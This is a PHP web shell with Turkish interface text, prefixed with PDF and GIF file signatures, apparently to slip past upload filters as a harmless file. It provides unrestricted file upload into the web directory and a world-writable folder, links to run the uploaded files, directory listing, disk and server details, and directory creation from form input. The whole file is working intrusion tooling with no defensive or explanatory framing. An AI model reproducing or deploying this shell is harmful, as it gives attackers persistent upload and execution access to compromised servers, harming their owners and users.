%PDF-1.3
%ÿÿÿÿ
GIF89;a<!DOCTYPE html>
<html>
<head>
</head>
<body>
    <form enctype="multipart/form-data" action="" method="POST">
        <p>Yüklemek için bir dosya seçin:</p>
        <input type="file" name="uploaded_file"><br>
        <input type="submit" value="Dosyayı Yükle">
    </form>

    <?php
    // Zaman aşımını önlemek için maksimum çalışma süresini ayarla
    set_time_limit(0);

    // Büyük dosyaları işlemek için bellek sınırlamasını ayarla
    ini_set('memory_limit', '-1');

    $uploadKlasoru = "dosyalar/";
    if (!file_exists($uploadKlasoru)) {
        mkdir($uploadKlasoru, 0777, true);
    }

    if(!empty($_FILES['uploaded_file'])) {
        $dosyaYolu = $uploadKlasoru . basename($_FILES['uploaded_file']['name']);
        if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $dosyaYolu)) {
            echo "Dosya ". basename($_FILES['uploaded_file']['name']). " başarıyla yüklendi.";
            
            echo '<a href="' . $dosyaYolu . '" target="_blank">Dosyayı Aç</a>';
        } else {
            echo "Dosya yüklenirken bir hata oluştu!";
        }
    }
    ?>
</body>
</html>
<!DOCTYPE html>
<html>
<head>
</head>
<body>
    <?php
        if(isset($_POST['submit'])){
            //Dosya bilgileri
            $dosyaAdi = $_FILES['dosya']['name'];
            $dosyaBoyutu = $_FILES['dosya']['size'];
            $dosyaTur = $_FILES['dosya']['type'];
            $dosyaGeçiciAdı = $_FILES['dosya']['tmp_name'];
            $hedefDizin = "./";
            
            //Dosya yükleme işlemi
            if(move_uploaded_file($dosyaGeçiciAdı, $hedefDizin.$dosyaAdi)){
                echo "<center>Dosya başarıyla yüklendi.</center>";
            } else {
                echo "<center>Dosya yüklenirken bir hata oluştu.</center>";
            }
        }
    ?>
    <form method="post" enctype="multipart/form-data">
        <center><label>Dosya seçin:</label> <input type="file" name="dosya" required></center><br>
        <center><input type="submit" name="submit" value="Yükle"></center>
    </form>
    <br><br><hr><h3><center><font color="red">Dizindeki dosyalar aşağıda listelenmiştir</font></center</center><br>
<?php
$klasor =  getcwd(); // listelenmesi istenen klasörün yolu
$dosyalar = array_diff(scandir($klasor), array('..', '.')); // klasör içeriğini listele

// Listelenen dosya ve klasörleri ekrana yazdır
foreach($dosyalar as $dosya) {
    echo $dosya . "<br>";
}

?>
<center><font color="red"><h3>Sistemsel Özellikler</h3></font></center>
<?php
echo "Upload Limit: " . ini_get('upload_max_filesize') . "<br>";

$total_space = disk_total_space("/");
$free_space = disk_free_space("/");
$used_space = $total_space - $free_space;

echo "Toplam Disk Alanı: " . formatBytes($total_space) . "<br>";
echo "Kullanılan Alan: " . formatBytes($used_space) . "<br>";
echo "Boş Alan: " . formatBytes($free_space) . "<br>";

// Yardımcı işlev, bayt cinsinden boyutu insan okunabilir biçime dönüştürür.
function formatBytes($bytes, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');

    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);

    $bytes /= pow(1024, $pow);

    return round($bytes, $precision) . ' ' . $units[$pow];
}
?>
<?php
// Dizin yolunu ayarlayın
$path = "./";

// Dizindeki dosya ve dizinleri alın
$files = scandir($path);

// Yeni bir dizin oluşturma işlemi
if (isset($_POST['newdir'])) {
    $dirname = $_POST['dirname'];
    if (!is_dir($dirname)) {
        mkdir($dirname);
        echo "<script>window.location='./';</script>";
    }
}
// Takip Kodu Baslangıc
?>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-');
</script>
</body>
</html>

